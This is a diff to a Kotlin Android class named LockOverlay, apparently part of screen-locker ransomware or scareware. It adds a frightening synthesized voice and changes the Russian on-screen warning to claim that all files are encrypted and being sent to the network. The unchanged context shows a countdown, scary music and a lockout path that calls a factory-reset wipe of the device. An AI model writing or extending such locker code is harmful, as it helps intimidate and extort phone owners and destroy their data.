@@ -19,6 +19,7 @@ class LockOverlay(private val context: Context) {
     private val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
     private val handler = Handler(Looper.getMainLooper())
     private val music = ScaryMusic()
+    private val voice = ScaryVoice(context)
 
     private var view: LinearLayout? = null
     private var timerText: TextView? = null
@@ -68,9 +69,9 @@ class LockOverlay(private val context: Context) {
         }
 
         val warn1 = TextView(context).apply {
-            text = "ВСЕ ФАЙЛЫ ЗАШИФРОВАНЫ"
+            text = "ВСЕ ФАЙЛЫ ЗАШИФРОВАНЫ И ОТПРАВЛЯЮТСЯ В СЕТЬ..."
             setTextColor(Color.BLACK)
-            textSize = 22f
+            textSize = 20f
             gravity = Gravity.CENTER
         }
 
@@ -207,6 +208,7 @@ class LockOverlay(private val context: Context) {
         }
 
         music.start()
+        voice.speak() // Запуск голоса
         handler.postDelayed(tick, 1000)
     }
 
@@ -230,6 +232,7 @@ class LockOverlay(private val context: Context) {
         lockedOut = true
         handler.removeCallbacksAndMessages(null)
         music.stop()
+        voice.stop()
         vibrate(1500)
         hide()
         FactoryReset.wipe(context)
@@ -244,6 +247,7 @@ class LockOverlay(private val context: Context) {
     private fun unlock() {
         handler.removeCallbacksAndMessages(null)
         music.stop()
+        voice.stop()
         hide()
     }
 
